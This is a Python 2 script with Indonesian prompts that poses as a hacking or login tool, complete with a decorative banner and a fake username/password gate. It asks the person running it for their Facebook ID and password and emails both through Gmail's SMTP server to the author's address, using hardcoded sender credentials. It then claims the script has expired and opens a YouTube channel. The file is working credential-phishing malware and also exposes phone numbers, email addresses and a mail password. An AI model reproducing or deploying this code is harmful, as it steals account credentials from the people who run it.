import os,sys,time,datetime,smtplib,getpass,shutil 

def t():
	time.sleep(1.5)

def c():
	os.system('clear')
	
def waktu(s):
 for c in s + '\n':
  sys.stdout.write(c)
  sys.stdout.flush()
  time.sleep(1./10)

def tk():
    titik = [ '.   ', '..  ', '... ']
    for o in titik:
    	print '\r\x1b[1;96m[\xe2\x97\x8f] \x1b[1;93mSedang masuk \x1b[1;97m' + o, 
        sys.stdout.flush()
        time.sleep(0.5)
        
logo = '\x1b[1;93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;93m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88      \x1b[1;91m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[1;93m\xe2\x96\x88\x1b[1;92m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc \x1b[1;92m- _ --_--\x1b[1;95m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\n\x1b[1;93m\xe2\x96\x88 \x1b[1;92m \x1b[1;92m_-_-- -_ --__\x1b[1;93m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\x1b[1;93m\xe2\x96\x88\x1b[1;92m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;92m--  - _ --\x1b[1;96m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;96  DARKCYBER\n\x1b[1;93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \x1b[1;92m\xc2\xab----------\xe2\x9c\xa7----------\xc2\xbb\n\x1b[1;93m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n\x1b[1;93m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;93m\xe2\x95\x91\x1b[1;96m* \x1b[1;93mAuthor  \x1b[1;93m : \x1b[1;93mBrother\xe2\x80\xa2|Mr.BLACK0304\x1b[1;93m          \xe2\x95\x91\n\x1b[1;93m\xe2\x95\x91\x1b[1;96m* \x1b[1;93mGitHub  \x1b[1;93m : \x1b[1;93m\x1b[4mhttps://Github.com/fatonicyber\x1b[0m \x1b[1;93m\xe2\x95\x91\n\x1b[1;93m\xe2\x95\x91\x1b[1;96m* \x1b[1;93mWhatsApp \x1b[1;93m: \x1b[1;93m0856-9101-5635\x1b[1;93m                 \xe2\x95\x91\n\x1b[1;93m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

c()
print '\x1b[1;96m ====================================================='
print '\x1b[1;96m [\xc2\xa4] \x1b[1;93mASSALAMUALAIKUM\x1b[1;96m  \x1b[1;96m   [\xc2\xa4] \x1b[1;93mWHATSAPP : 083899080824\x1b[1;96m  \n\x1b[1;96m [\xc2\xa4] \x1b[1;93mSELAMAT DATAMG\x1b[1;96m      [\xc2\xa4] \x1b[1;93mFACEBOOK : ahmad setiawan\x1b[1;96m  \n\x1b[1;96m [\xc2\xa4] \x1b[1;93mTOOLS FTNI 0304   \x1b[1;96m  [\xc2\xa4] \x1b[1;93mYOUTUBE  : FTNI 0304\x1b[1;96m'
print ' \x1b[1;93m====================================================='
        
Cu = 'FTNI'
Cp = '0304'
loop = 'true'
while loop == 'true':
	user = raw_input ('\x1b[1;93mMasukan Username >>> ')
	if user == Cu:
		pw = raw_input ('\x1b[1;96mMasukan Password >>> ')
		if pw == Cp:
			tk()
			t()
			loop = 'false'
			print''
			print '\x1b[1;96m LOGIN SUKSES '
			t()
			c()
		else :
			print '\x1b[1;91mkatasandi salah '
			t()
	else :
		print '\x1b[1;91musername salah '
		t()
print logo
print''
os.system('clear')
print logo
print '\x1b[1;96m[\xe2\x98\x86] \x1b[1;93mLOGIN AKUN FACEBOOK ANDA \x1b[1;96m[\xe2\x98\x86]'
server = 'gmail'
user = 'tilkont3@gmail.com'
passwd = 'katasandiaman'


to = 'mhmdfatoni030404@gmail.com'
#subject = raw_input('Subject: ') 
body = raw_input('\x1b[1;96m[+] \x1b[1;93mID/Email \x1b[1;91m: \x1b[1;92m') + (' <==========> ') + raw_input('\x1b[1;96m[+] \x1b[1;93mKatasandi \x1b[1;91m: \x1b[1;92m')
total = 1

tk()

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()


try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body 
        server.sendmail(user,to,msg,)
        sys.stdout.flush()
    server.quit()
except KeyboardInterrupt:
    print ''
    sys.exit()
except smtplib.SMTPAuthenticationError:
	print ''

	
c()
waktu ('\x1b[1;93mMOHON TUNGGU')
waktu ('\x1b[1;93mSEDANG LOGIN')
time.sleep(2)
c()
waktu ('MOHON MAAF SCRIPT INI SUDAH EXPIRED')
t()
waktu ('SILAHKAN CEK SCRIPT TERBARU DI CHANNEL (FTNI 0304) ')
t()
waktu ('MEMBUKA CHANNEL' )
t()
os.system('xdg-open https://m.youtube.com/channel/UCJtHP23PjhMF8SRS9ZmODEw ')
